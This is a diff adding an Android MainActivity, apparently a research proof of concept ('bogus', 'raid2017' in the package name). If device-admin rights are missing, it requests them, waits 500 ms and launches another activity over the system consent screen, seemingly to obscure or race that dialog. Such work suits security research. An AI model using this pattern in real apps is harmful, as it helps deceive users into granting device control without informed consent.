@@ -1,0 +1,37 @@
+package com.raid2017.bogus.a1admin2rulethemall;
+
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Intent;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+
+public class MainActivity extends AppCompatActivity {
+    private DevicePolicyManager mgr=null;
+    private ComponentName cn=null;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        cn=new ComponentName(this, AdminReceiver.class);
+        mgr=(DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);
+    }
+    public void lock(View view){
+        if (mgr.isAdminActive(cn)) {
+            mgr.lockNow();
+        } else {
+            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
+            startActivity(intent);
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+            startActivity(new Intent(this,Main2Activity.class));
+            finish();
+        }
+    }
+}
